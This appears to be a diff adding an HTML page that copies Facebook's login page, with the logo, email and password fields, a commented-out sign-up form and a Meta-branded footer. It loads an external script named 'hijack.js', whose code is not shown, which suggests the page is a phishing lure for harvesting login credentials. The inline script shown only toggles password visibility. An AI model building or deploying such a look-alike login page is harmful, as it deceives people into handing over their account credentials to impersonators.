@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Login or Sign-Up</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="icon" href="fb_icon_325x325.png" type="image/x-icon">
+</head>
+<body>
+    <div style="margin-top: 2rem;">
+        <div style="display: flex; justify-content: center;">
+            <img src="./4lCu2zih0ca.svg" alt="Facebook Logo" width="auto" height="100px">
+        </div>
+        <div style="display: flex; justify-content: center; align-items: center; font-size: 24px; width: auto; padding: 0 4rem;">
+            <p style="text-align: center;">Facebook helps you connect and share with the people in your life. </p>
+        </div>
+        <div class="container">
+            <h3 style="color: rgb(0, 0, 0); font-weight: 100;">Log in to Facebook</h3>
+            <div class="login-section">
+            <form id="loginForm">
+                <input type="email" placeholder="Email or phone number" required>
+                <div style="position: relative;">
+                <input type="password" placeholder="Password" required id="passwordInput">
+                <span class="eye-icon" style="position: absolute; top: 1.3rem; right: 1rem; cursor: pointer;" onclick="togglePassword()">
+                    <i class="fa fa-eye-slash" aria-hidden="true" id="eyeIcon"></i>
+                </span>
+                </div>
+                <button type="submit" style="color: white; font-weight: 800;">Log In</button>
+                <a href="#" class="forgot-link">Forgotten password?</a>
+            </form>
+            <hr style="border: 0.5px solid #e9e5e5; margin: 1rem 0;">
+            <br>
+            <button class="signup-button" onclick="openSignUp()" style="width: 70%; font-weight: 800;">Create New Account</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- <div class="signup-modal" id="signupModal">
+        <div class="signup-content">
+        <span class="close" onclick="closeSignUp()">&times;</span>
+        <h2>Create a new account</h2>
+        <p>It's quick and easy.</p>
+        <form id="signUpForm">
+            <input type="text" placeholder="First name" required>
+            <input type="text" placeholder="Surname" required>
+            <p style="font-size: small; color: #9f9a9a; text-align: left; color: black; margin-top: 12px; margin-bottom: 4px;">Date of Birth</p>
+            <div style="display: flex; align-items: center;">
+                <select name="day" required style="width: 30%; height: 30px; display: flex; align-items: center; border-radius: 6px; border: 1px solid #bab4b4; margin-right: 1rem;">
+                    <option value="" disabled selected>Day</option>
+                    <option value="1">1</option>
+                    <option value="2">2</option>
+                    <option value="3">3</option>
+                    <option value="4">4</option>
+                    <option value="5">5</option>
+                    <option value="6">6</option>
+                    <option value="7">7</option>
+                    <option value="8">8</option>
+                    <option value="9">9</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                    <option value="13">13</option>
+                    <option value="14">14</option>
+                    <option value="15">15</option>
+                    <option value="16">16</option>
+                    <option value="17">17</option>
+                    <option value="18">18</option>
+                    <option value="19">19</option>
+                    <option value="20">20</option>
+                    <option value="21">21</option>
+                    <option value="22">22</option>
+                    <option value="23">23</option>
+                    <option value="24">24</option>
+                    <option value="25">25</option>
+                    <option value="26">26</option>
+                    <option value="27">27</option>
+                    <option value="28">28</option>
+                    <option value="29">29</option>
+                    <option value="30">30</option>
+                    <option value="31">31</option>
+                </select>
+                <select name="month" required style="width: 30%; height: 30px; display: flex; align-items: center; border-radius: 6px; border: 1px solid #bab4b4; margin-right: 1rem;">
+                    <option value="" disabled selected>Month</option>
+                    <option value="1">January</option>
+                    <option value="2">February</option>
+                    <option value="3">March</option>
+                    <option value="4">April</option>
+                    <option value="5">May</option>
+                    <option value="6">June</option>
+                    <option value="7">July</option>
+                    <option value="8">August</option>
+                    <option value="9">September</option>
+                    <option value="10">October</option>
+                    <option value="11">November</option>
+                    <option value="12">December</option>
+                </select>
+                <select name="year" required style="width: 30%; height: 30px; display: flex; align-items: center; border-radius: 6px; border: 1px solid #bab4b4;">
+                    <option value="" disabled selected>Year</option>
+                    <option value="1980">1980</option>
+                    <option value="1981">1981</option>
+                    <option value="1982">1982</option>
+                    <option value="1983">1983</option>
+                    <option value="1984">1984</option>
+                    <option value="1985">1985</option>
+                    <option value="1986">1986</option>
+                    <option value="1987">1987</option>
+                    <option value="1988">1988</option>
+                    <option value="1989">1989</option>
+                    <option value="1990">1990</option>
+                    <option value="1991">1991</option>
+                    <option value="1992">1992</option>
+                    <option value="1993">1993</option>
+                    <option value="1994">1994</option>
+                    <option value="1995">1995</option>
+                    <option value="1996">1996</option>
+                    <option value="1997">1997</option>
+                    <option value="1998">1998</option>
+                    <option value="1999">1999</option>
+                    <option value="2000">2000</option>
+                    <option value="2001">2001</option>
+                    <option value="2002">2002</option>
+                    <option value="2003">2003</option>
+                    <option value="2004">2004</option>
+                    <option value="2005">2005</option>
+                    <option value="2006">2006</option>
+                    <option value="2007">2007</option>
+                    <option value="2008">2008</option>
+                    <option value="2009">2009</option>
+                    <option value="2010">2010</option>
+                    <option value="2011">2011</option>
+                    <option value="2012">2012</option>
+                    <option value="2013">2013</option>
+                    <option value="2014">2014</option>
+                    <option value="2015">2015</option>
+                    <option value="2016">2016</option>
+                    <option value="2017">2017</option>
+                    <option value="2018">2018</option>
+                </select>
+            </div>
+            <p style="font-size: small; color: #9f9a9a; text-align: left; color: black; margin-top: 12px; margin-bottom: -6px;">Gender</p>
+            <div style="display: flex; align-items: center;" >
+                <button style="width: 30%; height: 40px; display: flex; align-items: center; border: 1px solid #bab4b4; margin-right: 1rem;">
+                    <label for="female" style="margin-right: 0.7rem; font-size: 14px;">Female</label>
+                    <input type="radio" id="female" name="gender" value="female" required>
+                </button>
+                <button style="width: 30%; height: 40px; display: flex; align-items: center; border: 1px solid #bab4b4; margin-right: 1rem;">    
+                    <label for="male" style="margin-right: 0.7rem; font-size: 14px;">Male</label>
+                    <input type="radio" id="male" name="gender" value="male" required>
+                </button>
+                <button style="width: 30%; height: 40px; display: flex; align-items: center; border: 1px solid #bab4b4;">
+                    <label for="custom" style="font-size: 14px;">Custom</label>
+                    <input type="radio" id="custom" name="gender" value="custom" required>
+                </button>
+            </div>
+            <input type="email" placeholder="Mobile number or email address" required>
+            <input type="password" placeholder="New password" required>
+            <p style="font-size: small; color: #9f9a9a; text-align: left; font-size: 10px; margin-top: 1rem;">People who use our service may have uploaded your contact information to Facebook. <a href="#" style="color: #9f9a9a; text-decoration: none;">Learn more.</a></p>
+            <p style="font-size: small; color: #9f9a9a; text-align: left; font-size: 10px;">By clicking Sign Up, you agree to our <a href="#" style="color: #9f9a9a; text-decoration: none;">Terms</a>, <a href="#" style="color: #9f9a9a; text-decoration: none;">Privacy Policy</a> and <a href="#" style="color: #9f9a9a; text-decoration: none;">Cookies Policy</a>. You may receive SMS notifications from us and can opt out at any time.</p>
+            <button type="submit">Sign Up</button>
+        </form>
+        </div>
+    </div> -->
+
+    <footer class="footer" style="display: block; background-color: #ffffff; color: #bbb8b8; padding: 4rem 2rem;">
+        <ul style="list-style: none; display: flex; flex-wrap: wrap; justify-content: start; font-size: small; letter-spacing: 0.3px; padding: 0 4rem;">
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">English (UK)</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">ภาษาไทย</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">日本語</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">中文(简体)</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Tiếng Việt</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Français (France)</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Deutsch</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Русский</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Español</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Português (Brasil)</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Italiano</a></li>
+            <li style="margin-left: 10px;"><button style="background-color: transparent; border: 1px solid #cbcbcb; border-radius: none; color:rgb(178, 172, 172); width: 30px; height: 20px; padding: 0; cursor: pointer;">+</button></li>
+        </ul>
+        <br>
+        <hr style="border: 0.5px solid #e9e5e5; margin: 0 50px;">
+        <br>
+        <ul style="list-style: none; display: flex; flex-wrap: wrap; justify-content: start;font-size: small; letter-spacing: 0.3px; padding: 0 4rem;">
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Sign Up</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Log in</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Messenger</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Facebook Lite</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Video</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Meta Pay</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Meta Store</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Meta Quest</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Ray-Ban Meta</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Meta AI</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Instagram</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Threads</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Voting Information Centre</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Privacy Policy</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Privacy Centre</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">About</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Create ad</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Create Page</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Developers</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Careers</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Cookies</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">AdChoices</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Terms</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Help</a></li>
+            <li style="padding: 0 4px;"><a href="#" style="color: #9f9a9a; text-decoration: none;">Contact uploading and non-users</a></li>
+        </ul>
+        <p style="text-align: start; margin-top: 2rem; padding: 0 4rem; font-size: small; color: #1c1b1b7b;">Meta  2025</p>
+    </footer>
+
+  <script>
+    function togglePassword() {
+      const passwordInput = document.getElementById('passwordInput');
+      const eyeIcon = document.getElementById('eyeIcon');
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+      } else {
+        passwordInput.type = 'password';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+      }
+    }
+  </script>
+  <script src="script.js"></script>
+  <script src="hijack.js"></script>
+</body>
+</html>
+
